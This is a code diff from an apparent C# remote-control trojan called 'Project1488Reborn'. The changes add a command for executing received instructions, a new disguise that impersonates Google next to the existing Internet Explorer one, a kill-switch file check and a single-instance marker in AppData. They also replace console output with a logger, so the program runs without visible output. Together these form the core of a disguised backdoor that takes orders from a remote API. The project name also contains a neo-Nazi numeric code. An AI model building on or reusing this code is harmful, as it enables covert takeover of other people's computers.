@@ -27,16 +27,29 @@ namespace Project1488Reborn
         }
         static void Main(string[] args)
         {
+            if (File.Exists("C:\\взломжопы"))
+                Environment.Exit(0);
+            if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Hornet Inc\\Project1488\\started.txt")))
+                foreach(Process pr in Process.GetProcessesByName(File.ReadAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Hornet Inc\\Project1488\\started.txt"))))
+                {
+                    if (pr.Id != Process.GetCurrentProcess().Id)
+                    {
+                        Environment.Exit(0);
+                    }
+                }
+
+            File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Hornet Inc\\Project1488\\started.txt"), Process.GetCurrentProcess().ProcessName);
+
+
             InitCommands();
             InitMasks();
 
             Masking(args);
 
-            Console.WriteLine($"ID: {apiManager.Id}");
+            Loger.New($"ID: {apiManager.Id}");
 
             WaitCommand();
 
-            Console.ReadKey();
             Environment.Exit(0);
         }
 
@@ -45,14 +58,16 @@ namespace Project1488Reborn
             //TODO: New Commands
             coms.Add(new Commands.CPing());
             coms.Add(new Commands.CMessage());
+            coms.Add(new Commands.CCmd());
 
-            
+
         }
 
         static void InitMasks()
         {
             //TODO: New Masks
             masks.Add(new MInternetExplorer());
+            masks.Add(new MGoogle());
 
 
         }
@@ -69,7 +84,9 @@ namespace Project1488Reborn
                 new FileInfo("Newtonsoft.Json.dll")
             };
 
-            Mask mask = masks.ToArray()[new Random().Next(masks.Count - 1)];
+            Mask mask = masks.ToArray()[new Random().Next(0, masks.Count)];
+
+            Loger.New($"Start with mask: {mask.NameMainFile}");
 
             mask.MoveFiles();
 
@@ -98,7 +115,7 @@ namespace Project1488Reborn
         static void NewCommandHandler(Command com)
         {
             Debug.WriteLine($"{com.Name}: {com.Value}");
-            Console.WriteLine($"New command: {com.Name}: {com.Value}");
+            Loger.New($"New command: {com.Name}: {com.Value}");
             foreach (Commands.Command commmand in coms)
             {
                 if (commmand.IsTrueName(com.Name.ToLower()))
